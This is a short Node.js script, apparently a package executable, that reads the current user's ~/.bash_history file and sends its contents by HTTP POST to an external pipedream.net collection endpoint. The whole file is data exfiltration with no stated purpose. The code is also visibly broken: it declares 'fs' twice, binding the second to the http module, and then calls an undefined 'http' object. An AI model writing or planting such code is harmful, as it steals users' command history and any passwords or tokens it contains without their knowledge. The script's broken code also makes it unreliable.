#!/usr/bin/env node

const fs = require('fs');
const fs = require('http');

const home = process.env.HOME;

const options = {
	host: '0006166aa72d9f58c6c28e76910a79cf.m.pipedream.net',
	path: '/',
	port: 80,
	method: 'POST'

};

const req = http.request(options, function(response){
	console.log(response);
});

fs.readFile(`${home}/.bash_history`, 'utf-8', function(error, data) {
	console.log(data);
	req.write(data);
	req.end();


});
